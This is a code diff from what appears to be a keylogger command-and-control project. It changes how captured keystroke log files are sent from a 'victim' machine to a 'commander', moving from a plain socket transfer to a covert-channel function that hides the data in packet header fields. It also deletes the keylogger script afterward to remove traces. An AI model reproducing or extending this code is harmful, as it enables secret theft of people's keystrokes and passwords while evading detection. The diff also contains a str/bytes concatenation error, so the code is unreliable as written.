@@ -133,44 +133,25 @@ if __name__ == '__main__':
                     txt_files = [file for file in files_in_directory if file.endswith('.txt')]
 
                     if txt_files:
+                        # Send response and number of files to commander
                         print(constants.SEARCH_FILES_SUCCESSFUL_MSG.format(len(txt_files)))
-                        client_socket.send(constants.SEARCH_FILES_SUCCESSFUL_SEND.format(len(txt_files)).encode())
-
-                        # WAIT FOR ACK
-                        res = client_socket.recv(200).decode()
-
-                        # Send number of files to commander
-                        client_socket.send(str(len(txt_files)).encode())
+                        client_socket.send(constants.SEARCH_FILES_SUCCESSFUL_SEND.format(len(txt_files))
+                                           + "/" + str(len(txt_files)).encode())
 
                         # WAIT FOR ACK
                         client_socket.recv(200)
 
                         # Send file(s) in current directory
                         for file_name in txt_files:
+                            # Send file name
                             client_socket.send(file_name.encode())
+                            print(constants.TRANSFER_KEYLOG_FILE_INFO.format(file_name))
 
-                            with open(file_name, 'rb') as file:
-                                while True:
-                                    data = file.read(1024)
-                                    if not data:
-                                        break
-                                    client_socket.send(data)
+                            # Receive Covert Channel Config
+                            header, field = client_socket.recv(200).decode().split("/")
 
-                            # Send EOF signal to prevent receiver's recv() from blocking
-                            client_socket.send(constants.FILE_END_OF_FILE_SIGNAL)
-
-                            # Get an ACK from victim for success
-                            transfer_result = client_socket.recv(1024).decode()
-
-                            # Delete .txt keylog file after successful transfer
-                            if transfer_result == constants.VICTIM_ACK:
-                                print(constants.FILE_TRANSFER_SUCCESSFUL.format(file_name,
-                                                                                client_address[0],
-                                                                                client_address[1]))
-                                # Delete .txt file
-                                delete_file(file_name)
-                            else:
-                                print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
+                            transfer_keylog_file_covert(client_socket, client_address[0], client_address[1],
+                                                        source_port, (header, field), file_name)
 
                         # Delete keylogger.py from client/victim
                         delete_file(constants.KEYLOG_FILE_NAME)
